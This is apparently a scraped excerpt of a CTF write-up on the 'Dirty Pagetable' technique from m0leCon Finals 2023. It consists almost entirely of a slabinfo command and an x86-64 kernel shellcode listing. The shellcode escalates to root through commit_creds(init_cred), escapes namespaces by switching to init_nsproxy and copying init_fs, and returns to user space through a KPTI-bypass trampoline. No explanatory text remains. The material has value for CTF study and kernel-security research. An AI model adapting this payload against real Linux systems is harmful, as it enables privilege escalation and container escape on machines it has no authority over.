# Understanding Dirty Pagetable – m0leCon Finals 2023 CTF Writeup

> 原文: https://www.ctfiot.com/151200.html
> ID: 151200


```
# cat /proc/slabinfo | grep files_cache
files_cache 920 920 704 23 4 : tunables 0 0 0 : slabdata 40 40 0
```



```
init_cred equ 0x1445ed8
 commit_creds equ 0x00ae620
 find_task_by_vpid equ 0x00a3750
 init_nsproxy equ 0x1445ce0
 switch_task_namespaces equ 0x00ac140
 init_fs equ 0x1538248
 copy_fs_struct equ 0x027f890
 kpti_bypass equ 0x0c00f41

_start:
 endbr64
 call a
a:
 pop r15
 sub r15, 0x24d4c9

 ; commit_creds(init_cred) [3]
 lea rdi, [r15 + init_cred]
 lea rax, [r15 + commit_creds]
 call rax

 ; task = find_task_by_vpid(1) [4]
 mov edi, 1
 lea rax, [r15 + find_task_by_vpid]
 call rax

 ; switch_task_namespaces(task, init_nsproxy) [5]
 mov rdi, rax
 lea rsi, [r15 + init_nsproxy]
 lea rax, [r15 + switch_task_namespaces]
 call rax

 ; new_fs = copy_fs_struct(init_fs) [6]
 lea rdi, [r15 + init_fs]
 lea rax, [r15 + copy_fs_struct]
 call rax
 mov rbx, rax

 ; current = find_task_by_vpid(getpid())
 mov rdi, 0x1111111111111111 ; will be fixed at runtime
 lea rax, [r15 + find_task_by_vpid]
 call rax

 ; current->fs = new_fs [8]
 mov [rax + 0x740], rbx

 ; kpti trampoline [9]
 xor eax, eax
 mov [rsp+0x00], rax
 mov [rsp+0x08], rax
 mov rax, 0x2222222222222222 ; win
 mov [rsp+0x10], rax
 mov rax, 0x3333333333333333 ; cs
 mov [rsp+0x18], rax
 mov rax, 0x4444444444444444 ; rflags
 mov [rsp+0x20], rax
 mov rax, 0x5555555555555555 ; stack
 mov [rsp+0x28], rax
 mov rax, 0x6666666666666666 ; ss
 mov [rsp+0x30], rax
 lea rax, [r15 + kpti_bypass]
 jmp rax

 int3
```
